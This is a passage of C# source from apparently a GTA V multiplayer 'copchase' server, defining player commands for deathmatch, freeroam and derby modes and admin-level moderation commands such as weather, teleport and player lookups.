                        player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Invalid arena ID!");
                        EPlayer.Notify(player, "That arena is invalid!", "red", "fas fa-ban", false, 1000, "bottomCenter", "replace");
                    });

                    return;
                }
                NAPI.Task.Run(() =>
                {
                    player.SetSharedData("InLobby", -6);
                    player.SetSharedData("InDM", arenaid);
                    player.SetSharedData("Team", teamid);

                    EPlayer.Spawn(player, false);

                    EPlayer.Notify(player, $"Joined <strong>{arena.Key.Name}</strong>", "blue", "fas fa-users", false, 1000, "bottomCenter", "replace");
                });
            });
            
            return;
        }

        [Command("dm", "!{#AFAFAF}[USAGE] dm (arenaid)")]
        public static void cmd_dm(Player player, int arenaid)
        {
            if (arenaid == 666) return;
            if (!EPlayer.LoggedIn(player)) return;
            if (EPlayer.GetAccount(player).JailTime > 0) return;

            if (player.HasData("Spectating"))
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are in spectate mode!");
                EPlayer.Notify(player, "You are currently spectating.", "red", "fas fa-lock", false, 1000, "bottomCenter", "replace");
                return;
            }

            if (player.GetSharedData<int>("Team") != -1)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are currently in the copchase!");
                EPlayer.Notify(player, "You are in a copchase.", "red", "fas fa-lock", false, 1000, "bottomCenter", "replace");
                return;
            }

            if (arenaid < 0 || arenaid >= Settings.DMNames.Length)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}Invalid DM arena ID! /dmarenas to see all the arenas.");
                EPlayer.Notify(player, "Invalid arena.", "red", "fas fa-lock", false, 1000, "bottomCenter", "replace");
                return;
            }

            if (player.GetSharedData<int>("InLobby") <= -1)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not in any lobby!");
                EPlayer.Notify(player, "You must be in a lobby.", "red", "fas fa-lock", false, 1000, "bottomCenter", "replace");
                return;
            }

            if (Settings.LoggedInPlayers.Count(a => a.GetSharedData<int>("InLobby") == player.GetSharedData<int>("InLobby") && a.GetSharedData<int>("InDM") == arenaid) >= 7 + (Settings.LoggedInPlayers.Count(a => a.GetSharedData<int>("InLobby") == player.GetSharedData<int>("InLobby")) / 3))
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}That arena has maxed out on players.");
                EPlayer.Notify(player, "Arena is full.", "red", "fas fa-users-slash", false, 1000, "bottomCenter", "replace");
                return;
            }

            LobbyData elobby = Settings.Lobbies.Find(a => a.lobbyId == player.GetSharedData<int>("InLobby"));
            if (elobby == null) return;

            if (elobby.gameStatus == 2)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot go into DM while the match is starting!");
                EPlayer.Notify(player, "Unable to join.", "red", "fas fa-lock", false, 1000, "bottomCenter", "replace");
                return;
            }

            if (elobby.gameStatus == 1 && (elobby.Cops.Contains(player) || elobby.Fugitives.Contains(player)))
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot go into DM while in the copchase! (/lobby)");
                EPlayer.Notify(player, "You are in a copchase.", "red", "fas fa-lock", false, 1000, "bottomCenter", "replace");
                return;
            }


            player.SetSharedData("InDM", arenaid);

            int spawnID = new Random(DateTimeOffset.UtcNow.Millisecond).Next(Settings.DMSpawns[arenaid].GetLength(0));
            Vector3 dmSpawn = (Vector3)Settings.DMSpawns[arenaid][spawnID, 0];
            EPlayer.Spawn(player, false, dmSpawn);
            player.TriggerEvent("SetActorInvulnerable", false);

            EPlayer.Notify(player, $"Joined <strong>{Settings.DMNames[arenaid]}</strong>", "blue", "fas fa-users", false, 1000, "bottomCenter", "replace");
            return;
        }

        [Command("freeroam")]
        public static void cmd_freeroam(Player player)
        {
            if (!EPlayer.LoggedIn(player)) return;
            if (EPlayer.GetAccount(player).JailTime > 0) return;

            if (player.GetSharedData<int>("Team") != -1)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are currently in a copchase!");
                EPlayer.Notify(player, "You are currently in a copchase!", "red", "fas fa-ban", false, 1000, "bottomCenter", "replace");
                return;
            }

            if (player.GetSharedData<int>("InLobby") > -1)
            {
                LobbyData elobby = Settings.Lobbies.Find(a => a.lobbyId == player.GetSharedData<int>("InLobby"));
                if (elobby != null)
                {

                    if (elobby.gameStatus == 2)
                    {
                        player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot go into freeroam while the match is starting!");
                        EPlayer.Notify(player, "You cannot go into freeroam while copchase is starting!", "red", "fas fa-ban", false, 1000, "bottomCenter", "replace");
                        return;
                    }

                    if (elobby.gameStatus == 1 && (elobby.Cops.Contains(player) || elobby.Fugitives.Contains(player)))
                    {
                        player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot go into freeroam while in the copchase! (/lobby)");
                        EPlayer.Notify(player, "You are currently in a copchase!", "red", "fas fa-ban", false, 1000, "bottomCenter", "replace");
                        return;
                    }
                }
            }

            player.SetSharedData("InDM", -1);
            player.SetSharedData("InLobby", -3);
            EPlayer.Spawn(player, false, new Vector3(1061.547f, -720.113f, 56.786f));
            EPlayer.Notify(player, $"Joined <strong>Freeroam</strong>", "blue", "fas fa-check", false, 1000, "bottomCenter", "replace");

            cmd_fcmds(player);
            player.TriggerEvent("pushMsgToChat", " ");
            player.TriggerEvent("pushMsgToChat", "~g~TIP: You can use ~y~/fcmds~w~ at any time to see a list of freeroam commands.");
            return;
        }
        [Command("fcmds")]
        public static void cmd_fcmds(Player player)
        {
            player.TriggerEvent("pushMsgToChat", "~y~====================> ~w~FREEROAM ~y~<====================");
            player.TriggerEvent("pushMsgToChat", "In freeroam, you can do anything you want to! Here are some commands:");
            player.TriggerEvent("pushMsgToChat", "~y~> /world [ID 0-256] ~w~-> changes your \"virtual world\", a.k.a you only see entities from the world you set.");
            player.TriggerEvent("pushMsgToChat", "~y~> /mytime [hr 0-23] ~w~-> changes your time of day.");
            player.TriggerEvent("pushMsgToChat", "~y~> /myweather [ID] ~w~-> changes your weather.");
            player.TriggerEvent("pushMsgToChat", "~y~> /godmode ~w~-> toggles freeroam invincibility.");
            player.TriggerEvent("pushMsgToChat", "~y~> /fix ~w~-> repairs the vehicle you are inside of.");
            player.TriggerEvent("pushMsgToChat", "~y~> /gun [ammo][name] ~w~-> gives you a weapon of your choice.");
            player.TriggerEvent("pushMsgToChat", "~y~> /veh [name]<opt:color1><opt:color2> ~w~-> spawns a vehicle of your choice; you can also specify a color if you want to.");
            player.TriggerEvent("pushMsgToChat", "~y~> /teleport ~w~-> teleport to a specific location.");
            player.TriggerEvent("pushMsgToChat", "~y~> /goto [player] ~w~-> teleport to a specific player.");
            player.TriggerEvent("pushMsgToChat", " ");
            player.TriggerEvent("pushMsgToChat", "~y~> /panim [library][name][flags] ~w~-> play ANY available GTA V animation. ");
            player.TriggerEvent("pushMsgToChat", "~g~TIP: ~b~Flags list: ~w~tiny.cc/anim_flags | ~b~Animations: ~w~alexguirre.github.io/animations-list/");
        }

        [Command("derby")]
        public static void cmd_derby(Player player)
        {
            if (!EPlayer.LoggedIn(player)) return;
            if (EPlayer.GetAccount(player).JailTime > 0) return;

            if (player.GetSharedData<int>("Team") != -1)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are currently in the copchase!");
                EPlayer.Notify(player, "You are currently in a copchase!", "red", "fas fa-ban", false, 1000, "bottomCenter", "replace");
                return;
            }

            if (player.GetSharedData<int>("InLobby") > -1)
            {
                LobbyData elobby = Settings.Lobbies.Find(a => a.lobbyId == player.GetSharedData<int>("InLobby"));
                if (elobby == null) return;

                if (elobby.gameStatus == 2)
                {
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot go into derby while the match is starting!");
                    EPlayer.Notify(player, "You cannot join derby while the copchase is starting!", "red", "fas fa-ban", false, 1000, "bottomCenter", "replace");
                    return;
                }
            }

            if (player.HasData("DerbyVehicle"))
            {
                try { player.GetData<Vehicle>("DerbyVehicle").Delete(); }
                catch { }

                player.ResetData("DerbyVehicle");
            }

            player.SetData("DerbySpawnTick", Environment.TickCount64 + 2000);
            player.SetSharedData("InDM", -1);
            player.SetSharedData("InLobby", -4);

            EPlayer.Spawn(player, false, ((Vector3)Settings.DerbySpawns[0, 0]).Around(2.0f));
            EPlayer.Notify(player, $"Joined <strong>Derby</strong>", "blue", "fas fa-check", false, 1000, "bottomCenter", "replace");
            return;
        }

        [Command("setweather", "!{#AFAFAF}[USAGE] setweather (weatherid)", Alias = "sweather")]
        public void cmd_setweather(Player player, int weatherid)
        {
            if (!EPlayer.LoggedIn(player)) return;

            if (EPlayer.GetAccount(player).Admin < 1 && EPlayer.GetAccount(player).DonatorLevel < 1)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You do not have the permission to use this command.");
                return;
            }

            LobbyData lobby = Settings.Lobbies.Find(a => a.lobbyId == player.GetSharedData<int>("InLobby"));

            if (lobby == null) { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not in a copchase lobby."); return; }

            if (weatherid < 0 || weatherid > 9) { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Invalid weather ID! Possible ID's are between 0-9."); return; }

            lobby.Weather = weatherid;
            string weatherString = Main.WeatherToForecast(lobby.Weather);

            foreach (Player eplayer in Settings.LoggedInPlayers)
            {
                if (eplayer.GetSharedData<int>("InLobby") == lobby.lobbyId)
                {
                    eplayer.TriggerEvent("SetTimeWeather", lobby.Time[0], lobby.Time[1], lobby.Time[2], lobby.Weather);

                    if (EPlayer.GetAccount(player).Admin > 0) eplayer.TriggerEvent("pushMsgToChat", "!{#FF6347}AdmCmd: An admin has changed the current lobby weather: !{#A8FFAB} " + weatherString);
                    else eplayer.TriggerEvent("pushMsgToChat", "!{#FF6347}DonatorCmd: " + player.Name + " has changed the current lobby weather: !{#A8FFAB} " + weatherString);
                }
            }

            EPlayer.SendMessageToAllAdmins("!{#FF6347}[AdmCmd] " + player.Name + " has changed weather in lobby " + lobby.lobbyId);
            return;
        }

        [Command("settime", "!{#AFAFAF}[USAGE] settime (hour)", Alias = "stime")]
        public void cmd_settime(Player player, int hour)
        {
            if (!EPlayer.LoggedIn(player)) return;

            if (EPlayer.GetAccount(player).Admin < 1 && EPlayer.GetAccount(player).DonatorLevel < 1)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You do not have the permission to use this command.");
                return;
            }

            LobbyData lobby = Settings.Lobbies.Find(a => a.lobbyId == player.GetSharedData<int>("InLobby"));

            if (lobby == null) { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not in a copchase lobby."); return; }

            if (hour < 0 || hour > 23) { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Invalid hour! Possible hours are between 0-23."); return; }

            lobby.Time[0] = hour;

            foreach (Player eplayer in Settings.LoggedInPlayers)
            {
                if (eplayer.GetSharedData<int>("InLobby") == lobby.lobbyId)
                {
                    eplayer.TriggerEvent("SetTimeWeather", lobby.Time[0], lobby.Time[1], lobby.Time[2], lobby.Weather);

                    if (EPlayer.GetAccount(player).Admin > 0) eplayer.TriggerEvent("pushMsgToChat", "!{#FF6347}AdmCmd: An admin has changed the current lobbies hour to " + lobby.Time[0]);
                    else eplayer.TriggerEvent("pushMsgToChat", "!{#FF6347}DonatorCmd: " + player.Name + " has changed the current lobbies hour to " + lobby.Time[0]);
                }
            }

            EPlayer.SendMessageToAllAdmins("!{#FF6347}[AdmCmd] " + player.Name + " has changed time in lobby " + lobby.lobbyId);
            return;
        }

        [Command("gotopos", "!{#AFAFAF}[USAGE] gotopos (x) (y) (z) (optional: heading)", Alias = "gpos")]
        public void cmd_gotopos(Player player, float x, float y, float z, float heading = 65535f)
        {
            if (!EPlayer.LoggedIn(player)) return;

            if (EPlayer.GetAccount(player).Admin < 3)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You do not have the permission to use this command.");
                return;
            }

            player.Position = new Vector3(x, y, z);
            if(heading != 65535f)
            {
                player.Heading = heading;
            }
        }

        [Command("getip", "!{#AFAFAF}[USAGE] getip (target)")]
        public void cmd_getip(Player player, Player target)
        {
            if (!EPlayer.LoggedIn(player)) return;

            if (EPlayer.GetAccount(player).Admin < 3)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You do not have the permission to use this command.");
                return;
            }

            // try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:getip:{target.Name}"); } catch { }
            Logs.LogAdmin(player, $"Attempted to retrieve {target.Name}'s IP address.");

            if (EPlayer.LoggedIn(target))
            {
                if (EPlayer.GetAccount(target).Admin >= EPlayer.GetAccount(player).Admin && target != player)
                {
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target has higher admin level than you.");
                    return;
                }
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}" + target.Name + "'s register IP address: " + EPlayer.GetAccount(target).RegisterIP);
            }

            player.TriggerEvent("pushMsgToChat", "!{#FF6347}" + target.Name + "'s current IP address: " + target.Address);
            return;
        }

        [Command("getsc", "!{#AFAFAF}[USAGE] getsc (target)")]
        public void cmd_getsc(Player player, Player target)
        {
            if (!EPlayer.LoggedIn(player)) return;

            if (EPlayer.GetAccount(player).Admin < 3)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You do not have the permission to use this command.");
                return;
            }

            // try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:getip:{target.Name}"); } catch { }
            Logs.LogAdmin(player, $"Attempted to retrieve {target.Name}'s social club info.");

            if (EPlayer.LoggedIn(target))
            {
                if (EPlayer.GetAccount(target).Admin >= EPlayer.GetAccount(player).Admin && target != player)
                {
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target has higher admin level than you.");
                    return;
                }
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}" + target.Name + $"'s register social club: {EPlayer.GetAccount(target).RegisterSC} ({EPlayer.GetAccount(target).RegisterRID})");
            }

            player.TriggerEvent("pushMsgToChat", "!{#FF6347}" + target.Name + $"'s current social club: {target.SocialClubName} ({target.SocialClubId})");
            return;
        }

        [Command("gethwid", "!{#AFAFAF}[USAGE] gethwid (target)")]
        public void cmd_gethwid(Player player, Player target)
        {
            if (!EPlayer.LoggedIn(player)) return;

            if (EPlayer.GetAccount(player).Admin < 3)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You do not have the permission to use this command.");
                return;
            }

            // try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:gethwid:{target.Name}"); } catch { }
            Logs.LogAdmin(player, $"Attempted to retrieve {target.Name}'s HWID.");
            if (EPlayer.LoggedIn(target))
            {
                if (EPlayer.GetAccount(target).Admin >= EPlayer.GetAccount(player).Admin && target != player)
                {
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target has higher admin level than you.");
                    return;
                }
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}" + target.Name + "'s register hardware ID: " + EPlayer.GetAccount(target).RegisterHWID);
            }

            player.TriggerEvent("pushMsgToChat", "!{#FF6347}" + target.Name + "'s current hardware ID: " + target.Serial);
            return;
        }

        [Command("setdimension", "!{#AFAFAF}[USAGE] setdimension (target) (vw)", Alias = "setvw")]
        public void cmd_setdimension(Player player, Player target, uint vw)
        {
            if (!EPlayer.LoggedIn(player)) return;

            if (EPlayer.GetAccount(player).Admin < 2)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You do not have the permission to use this command.");
                return;
            }
            Logs.LogAdmin(player, $"Set {target.Name}'s dimension to {vw}.");
            target.Dimension = vw;
            player.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}AdmCmd: {target.Name}'s dimension/world has been set to {vw}.");
        }

        [Command("sendtolobby", "!{#AFAFAF}[USAGE] sendtolobby (target)", Alias = "stl")]
        public void cmd_sendtolobby(Player player, Player target)
        {
            if (!EPlayer.LoggedIn(player) || !EPlayer.LoggedIn(target)) return;

            if (EPlayer.GetAccount(player).Admin < 1)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You do not have the permission to use this command.");
                return;
            }

            if (target.GetSharedData<int>("InLobby") == -5)
            {
                if (target.GetData<bool>("Creator_Using") == true)
                {
                    CharacterData ConvChar = new CharacterData();
                    string PlayerChar = EPlayer.GetAccount(target).Character;

                    try
                    {
                        if (PlayerChar == null || PlayerChar.Length < 10) throw (new System.Exception("Invalid characterdata-7 sending to creation."));
                        ConvChar = NAPI.Util.FromJson<CharacterData>(PlayerChar);

                        EPlayer.ApplyCharacter(target, ConvChar);
                    }
                    catch
                    {
                        CharacterData charp = new CharacterData();
                        EPlayer.GetAccount(target).Character = "{}";
                        EPlayer.ApplyCharacter(target, charp); // Give them the default CHAR.
                    }

                    target.SetData("Creator_Using", false);
                    target.TriggerEvent("toggleCreator", false);
                }
                else if (target.GetData<bool>("Tuner_Using") == true)
                {
                    target.TriggerEvent("DestroyPlayerCamera");
                    if (target.HasData("Tuner_Vehicle")) target.GetData<Vehicle>("Tuner_Vehicle").Delete();

                    target.ResetData("Tuner_Vehicle");
                    target.SetData("Tuner_Using", false);
                }

                EPlayer.Spawn(player);
            }

            // try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:sendtolobby:{target.Name}"); } catch { }
            Logs.LogAdmin(player, $"Sent {target.Name} to lobby.");
            target.SetData("ForcedLobby", true);
            cmd_lobby(target);

            EPlayer.SendMessageToAllAdmins($"!{{#FF6347}}[AdmCmd] {player.Name} has sent {target.Name} to lobby.");
        }

        [Command("resetclothing", "!{#AFAFAF}[USAGE] resetclothing (target) (cop/fugitive)")]
        public void cmd_resetclothing(Player player, Player target, string team)
        {
            if (!EPlayer.LoggedIn(player) || !EPlayer.LoggedIn(target)) return;

            if (EPlayer.GetAccount(player).Admin < 1)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You do not have the permission to use this command.");
                return;
            }

            CharacterData ConvChar = new CharacterData();

            try
            {
                if (EPlayer.GetAccount(target).Character != null && EPlayer.GetAccount(target).Character.Length > 10)
                {
                    ConvChar = NAPI.Util.FromJson<CharacterData>(EPlayer.GetAccount(target).Character);
                }
                else EPlayer.GetAccount(target).Character = NAPI.Util.ToJson(ConvChar);
            }
            catch
            {
                ConvChar = new CharacterData();
            }

            try
            {

                if (team.StartsWith("cop", StringComparison.OrdinalIgnoreCase))
                {
                    ConvChar.Clothing[1] = new ClothingData(1, 0); // Cop MALE
                    ConvChar.Clothing[3] = new ClothingData(1, 1); // Cop FEMALE
                    EPlayer.GetAccount(target).Character = NAPI.Util.ToJson(ConvChar);

                    target.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Your cop clothing has been reset by an admin.");

                    EPlayer.ApplyCharacter(target, ConvChar, (target.GetSharedData<int>("Team") < 0) ? (EPlayer.GetAccount(target).LobbyClothing) : (target.GetSharedData<int>("Team")));
                }
                else if (team.StartsWith("fugitive", StringComparison.OrdinalIgnoreCase))
                {
                    ConvChar.Clothing[0] = new ClothingData(0, 0); // Fugitive MALE
                    ConvChar.Clothing[2] = new ClothingData(0, 1); // Fugitive FEMALE
                    EPlayer.GetAccount(target).Character = NAPI.Util.ToJson(ConvChar);

                    target.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Your fugitive clothing has been reset by an admin.");

                    EPlayer.ApplyCharacter(target, ConvChar, (target.GetSharedData<int>("Team") < 0) ? (EPlayer.GetAccount(target).LobbyClothing) : (target.GetSharedData<int>("Team")));
                }
                else
                {
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Invalid team, clothings can only be reset for 'fugitive' or 'cop' team.");
                    return;
                }


                Logs.LogAdmin(player, $"Reset {target.Name}'s {team.ToLower()} clothing.");

                EPlayer.SendMessageToAllAdmins($"!{{#FF6347}}[AdmCmd] {player.Name} has reset {target.Name}'s {team.ToLower()} clothing.");
            }
            catch { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!!] Unknown error occured, ask kevy to check da cooomsole."); }
        }

        [Command("putinveh", "!{#AFAFAF}[USAGE] putinveh (target) (player) (optional: seatid) | \"Target\" is put inside \"player\"'s vehicle.", Alias = "piv, putinvehicle")]
        public void cmd_putinveh(Player player, Player target, Player toputin, int seat = 0)
        {
            if (!EPlayer.LoggedIn(player)) return;

            if (EPlayer.GetAccount(player).Admin < 1)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You do not have the permission to use this command.");
                return;
            }

            if (!toputin.IsInVehicle)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}The player is not in any vehicle!");
                return;
            }

            int nextseat = seat;
            while (Settings.LoggedInPlayers.Count(a => a.IsInVehicle && a.Vehicle == toputin.Vehicle && a.VehicleSeat == nextseat) >= 1)
            {
                nextseat++;
            }

            Logs.LogAdmin(player, $"Put {target.Name} in {toputin.Name}'s vehicle.");
            target.TriggerEvent("ToggleSeatbelt", false);
            target.ResetData("Seatbelt");
            target.Position = new Vector3(toputin.Vehicle.Position.X, toputin.Vehicle.Position.Y, toputin.Vehicle.Position.Z + 5f);

            target.SetIntoVehicle(toputin.Vehicle, nextseat);

            EPlayer.SendMessageToAllAdmins($"!{{#FF6347}}[AdmCmd] {player.Name} has put {target.Name} in {toputin.Name}'s vehicle.");
        }

        [Command("restock")]
        public void cmd_restock(Player player)
        {
            if (!EPlayer.LoggedIn(player)) return;

            if (player.IsInVehicle)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are in a vehicle.");
                return;
            }

            Vehicle targetVeh = null;
            foreach (Vehicle v in RAGE.Entities.Vehicles.All)
            {
                if (v.Dimension == player.Dimension && v.Position.DistanceTo(player.Position) <= 5.0)
                {
                    if (!v.HasSharedData("TrunkOpened")) continue;

                    targetVeh = v;
                    break;
                }
            }

            if (targetVeh == null)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not close enough to a vehicle with a trunk open!");
                return;
            }

            if (!targetVeh.HasData("BackupAmmo"))
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}There's no ammo inside the trunk. (Cop vehicles spawn with ammo)");
                return;
            }

            WeaponHash holding = player.CurrentWeapon; // store weapon which the player was holding

            Dictionary<string, int> ammoBox = targetVeh.GetData<Dictionary<string, int>>("BackupAmmo");
            string notificationString = "";
            foreach (KeyValuePair<long, jWeaponData> i in Settings.WeaponData)
            {
                if (player.GetWeaponAmmo((WeaponHash)i.Key) > 0 || player.CurrentWeapon == (WeaponHash)i.Key || (WeaponHash)i.Key == WeaponHash.Bzgas)
                {
                    if (i.Value.AmmoType != null)
                    {
                        int weaponAmmo = 0;
                        if (ammoBox.TryGetValue(i.Value.AmmoType, out weaponAmmo))
                        {
                            player.SetWeaponAmmo((WeaponHash)i.Key, player.GetWeaponAmmo((WeaponHash)i.Key) + weaponAmmo);
                            notificationString = notificationString + $"<p>+{weaponAmmo} ammo to <strong>{i.Value.Name}</strong></p>";
                            ammoBox.Remove(i.Value.AmmoType);
                        }
                    }
                }
            }
            player.GiveWeapon(holding, 1); // equipping them with the weapon they were holding

            if (notificationString.Length >= 3)
            {
                targetVeh.SetData("BackupAmmo", ammoBox);

                EPlayer.Action(player, "restocks from an ammunition box.");
                EPlayer.Notify(player, notificationString, "green", "fas fa-boxes", false, 2000, "bottomRight");
            }
            else
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}There's no ammunition for your weapons. If the weapon is empty, hold it in hand and retry.");
            }

            if (ammoBox.Count == 0)
            {
                targetVeh.ResetSharedData("BackupAmmo");
            }

            return;
        }

        [Command("keys")]
        public void cmd_keys(Player player)
        {
            if (!EPlayer.LoggedIn(player)) return;

            player.TriggerEvent("pushMsgToChat", "!{#FF6347}[Key] !{#FFFFFF}Function");
            player.TriggerEvent("pushMsgToChat", "!{#FF6347}[M] !{#FFFFFF}Toggle menu");
            player.TriggerEvent("pushMsgToChat", "!{#FF6347}[N] !{#FFFFFF}Push to talk voicechat, Hold N+TAB to toggle voice (/voicebind to change)");
            player.TriggerEvent("pushMsgToChat", "!{#FF6347}[Z] !{#FFFFFF}Toggle GPS as a !{#0097FF}cop !{#FFFFFF}(/gpsbind to change)");
            player.TriggerEvent("pushMsgToChat", "!{#FF6347}[O] !{#FFFFFF}Toggle scoreboard (!{#FFFF00}F2 !{#FFFFFF}for cursor)");
            player.TriggerEvent("pushMsgToChat", "!{#FF6347}[L] !{#FFFFFF}Lock/unlock vehicle");
            player.TriggerEvent("pushMsgToChat", "!{#FF6347}[X] !{#FFFFFF}Rapple from a !{#FFFF00}supported !{#FFFFFF}helicopter");
            player.TriggerEvent("pushMsgToChat", "!{#FF6347}[F7] !{#FFFFFF}Hide/show HUD & chat (Hold !{#FF0000}SHIFT+F7 !{#FFFFFF}to toggle nametags)");
            player.TriggerEvent("pushMsgToChat", "!{#FF6347}[F6] !{#FFFFFF}Toggle weapon crosshair/reticule");
            player.TriggerEvent("pushMsgToChat", "!{#FF6347}[F5] !{#FFFFFF}Toggle vehicle /dl information");
            player.TriggerEvent("pushMsgToChat", "!{#FF6347}[B] !{#FFFFFF}Toggle silent siren in !{#0097FF}police !{#FFFFFF}vehicles");
            player.TriggerEvent("pushMsgToChat", "!{#FF6347}[H] !{#FFFFFF}Cuff a !{#FFAE00}fugitive");
            player.TriggerEvent("pushMsgToChat", "!{#FF6347}[J: OnFoot] !{#FFFFFF}Close/open vehicle's (must be unlocked) !{#FFAE00}trunk/hood");
            player.TriggerEvent("pushMsgToChat", "!{#FF6347}[J: InCar] !{#FFFFFF}Fasten/unfasten seatbelt (stops from falling out/leaving)");
        }

        [Command("teleport", "!{#AFAFAF}[USAGE] teleport (option: chilliad, airport)", Alias = "tp", GreedyArg = true)]
        public void cmd_teleport(Player player, string tp)
        {
            if (!EPlayer.LoggedIn(player) || player.GetSharedData<int>("InLobby") != -3)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You must be in freeroam to use this command!");
                return;
            }

            if (tp.Contains("chilliad"))
            {
                player.Position = new Vector3(501.52545f, 5604.5723f, 797.91016f);
            }
            else if (tp.Contains("airport") || tp.Contains("lsia"))
            {
                player.Position = new Vector3(-1405.521f, -3075.9614f, 14.492183f);
            }
            else player.TriggerEvent("pushMsgToChat", "!{#FF6347}Invalid TP! !{#FFFFFF}Possible tps: 'chilliad', 'airport'");
            return;
        }

        [Command("dbgplayanim", Alias = "panim")]
        public void cmd_playanim(Player player, string lib, string name, int flags)
        {
            if (!EPlayer.LoggedIn(player)) return;
            if (EPlayer.GetAccount(player).Admin >= 4 || player.GetSharedData<int>("InLobby") == -3)
            {
                Events.RequestPlayAnimation(player, lib, name, flags);
                player.TriggerEvent("pushMsgToChat", "~y~[ANIMATION]~w~ Attempting to play animation ~y~" + name + "~w~.");
            }
            return;
        }

        [Command("dbglinkmane", Alias = "dbgcef", GreedyArg = true)]
        public void cmd_dbgcef(Player player, string link)
        {
            if (EPlayer.GetAccount(player).Admin < 6) return;
            player.TriggerEvent("showBrowser", link);
            return;
        }

        [Command("dbgsetcol")]
        public void cmd_dbgsetcol(Player player, bool state)
        {
            if (EPlayer.GetAccount(player).Admin < 6) return;

            player.SetSharedData("Collisions", state);
            return;
        }

        [Command("setgamevehicle", Alias = "dbgsetcar,dbgcargame")]
        public void cmd_dbgcargame(Player player, Player target, int team, string car)
        {
            if (!EPlayer.LoggedIn(player)) return;
            if (EPlayer.GetAccount(player).Admin < 5 && !player.Name.Equals("KevY", StringComparison.OrdinalIgnoreCase)) return;
            if (!EPlayer.LoggedIn(target)) return;

            if (team == 0) EPlayer.GetAccount(target).CarFugitive = car;
            else if (team == 1) EPlayer.GetAccount(target).CarCop = car;
            return;
        }
        [Command("resetgamevehicles", Alias = "resetgameveh")]
        public void cmd_resetgameveh(Player player, Player target)
        {
            if (!EPlayer.LoggedIn(player)) return;
            if (EPlayer.GetAccount(player).Admin < 1)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] ~w~You are not authorized to use this command!");
                return;
            }
            if (!EPlayer.LoggedIn(target)) return;

            EPlayer.GetAccount(target).CarFugitive = "?";
            EPlayer.GetAccount(target).CarCop = "police";

            Logs.LogAdmin(player, $"Reset ${target.Name}'s game vehicles to their defaults.");
            target.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}[!] ~w~Admin {player.Name} has reset your game vehicles to the default ones.");
            player.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}[!] ~w~You've set {target.Name}'s game vehicles to the default ones.");
            return;
        }
        [Command("resetcharacter", Alias = "resetchar")]
        public void cmd_resetcharacter(Player player, Player target)
        {
            if (!EPlayer.LoggedIn(player)) return;
            if (EPlayer.GetAccount(player).Admin < 2)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] ~w~You are not authorized to use this command!");
                return;
            }
            if (!EPlayer.LoggedIn(target)) return;

